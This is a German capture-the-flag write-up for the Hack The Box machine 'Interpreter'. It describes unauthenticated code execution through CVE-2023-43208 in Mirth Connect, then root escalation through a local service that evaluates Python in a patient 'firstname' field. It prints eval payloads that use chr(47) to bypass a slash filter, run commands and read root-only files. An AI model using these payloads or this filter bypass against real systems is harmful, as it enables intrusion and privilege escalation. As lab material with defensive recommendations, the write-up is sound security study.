# Hack The Box: Interpreter Writeup

> Öffentliches Writeup für GitHub. Flags sind absichtlich nicht enthalten.

## Überblick

Interpreter ist eine Linux-Maschine mit Mirth Connect 4.4.0. Der initiale Zugriff erfolgt über CVE-2023-43208, eine unauthentifizierte XStream-Deserialization-Schwachstelle in Mirth Connect. Die Privilege Escalation nutzt anschließend einen lokalen Root-Service, der Patientendaten verarbeitet und Python-Ausdrücke aus einem XML-/Patientenfeld evaluiert.

## Recon

Initialer Scan:

```bash
nmap -Pn -sC -sV -oN nmap.txt 10.129.244.184
```

Interessante Dienste:

```text
22/tcp   OpenSSH 9.2p1 Debian
80/tcp   Jetty / Mirth Connect Administrator
443/tcp  Jetty HTTPS / Mirth Connect Administrator
```

Die Version konnte über `/webstart.jnlp` und die API geprüft werden:

```bash
curl -k https://10.129.244.184/webstart.jnlp
curl -k -H 'X-Requested-With: OpenAPI' https://10.129.244.184/api/server/version
```

Ergebnis:

```text
Mirth Connect 4.4.0
```

## Foothold: Mirth Connect CVE-2023-43208

Mirth Connect 4.4.0 ist gegen CVE-2023-43208 anfällig. Dabei kann der unauthentifizierte Endpoint `/api/users` mit XML/XStream-Payloads zur Codeausführung missbraucht werden.

Wichtiger Header:

```text
X-Requested-With: OpenAPI
```

Test-RCE:

```bash
id
```

Ausführungskontext:

```text
uid=103(mirth) gid=111(mirth)
```

Da Reverse Shells und direkte API-Ausgaben nicht immer stabil waren, wurde Command Output in den statisch ausgelieferten Mirth-Pfad geschrieben:

```text
/usr/local/mirthconnect/public_html
```

Danach konnte die Ausgabe per HTTPS abgerufen werden:

```bash
curl -k https://10.129.244.184/<output-file>
```

## Enumeration als mirth

Die Mirth-Konfiguration enthielt Datenbankinformationen:

```text
/usr/local/mirthconnect/conf/mirth.properties
```

Relevante Werte:

```text
database: mc_bdd_prod
database.username: mirthdb
database.password: <password>
```

Die weitere Enumeration zeigte einen lokalen Service:

```text
127.0.0.1:54321 /addPatient
```

Der Service wurde von einem Root-Prozess bedient. Die wichtige Schwachstelle: ein Python-Ausdruck im `firstname`-Feld wurde evaluiert.

## Privilege Escalation: Python Eval im lokalen Root-Service

Der lokale Service akzeptierte Patientendaten und evaluierte Inhalte im Format:

```text
{python_expression}
```

Ein Slash-Filter konnte mit `chr(47)` umgangen werden.

Beispiel für Root-Codeausführung:

```python
{__import__('os').popen('id').read()}
```

Lesen der User-Flag:

```python
{open(chr(47)+'home'+chr(47)+'sedric'+chr(47)+'user.txt').read()}
```

Lesen der Root-Flag:

```python
{open(chr(47)+'root'+chr(47)+'root.txt').read()}
```

Ein Python-Script wurde per Mirth-RCE abgelegt und lokal gegen `http://127.0.0.1:54321/addPatient` ausgeführt. Die Ergebnisse wurden wieder in `/usr/local/mirthconnect/public_html/flags.txt` geschrieben und anschließend per HTTPS gelesen.

## Kill Chain

```text
Mirth Connect 4.4.0
    -> CVE-2023-43208 unauthenticated XStream deserialization
    -> RCE as mirth
    -> Read Mirth configuration and enumerate local services
    -> Find root-owned patient notification service on 127.0.0.1:54321
    -> Abuse Python eval in firstname field
    -> Read user.txt and root.txt as root
```

## Takeaways

- Mirth Connect sollte nicht ungepatcht und unauthentifiziert erreichbar sein.
- CVE-2023-43208 ist kritisch, weil sie vor Authentifizierung Codeausführung ermöglicht.
- Lokale Services sind nach einem Foothold oft die entscheidende Privesc-Fläche.
- Dynamisches `eval()` auf Feldern aus externen Daten ist extrem gefährlich, insbesondere in Root-Prozessen.
- Simple Filter wie Slash-Blocking sind keine Sicherheitsgrenze.

## Empfehlungen

- Mirth Connect auf eine gepatchte Version aktualisieren.
- Administrative Mirth-Endpunkte nicht direkt exponieren.
- Localhost-Services trotzdem authentifizieren und autorisieren.
- Keine dynamische Auswertung von Nutzerdaten mit `eval()`.
- Secrets in Konfigurationsdateien minimieren und Dateirechte härten.
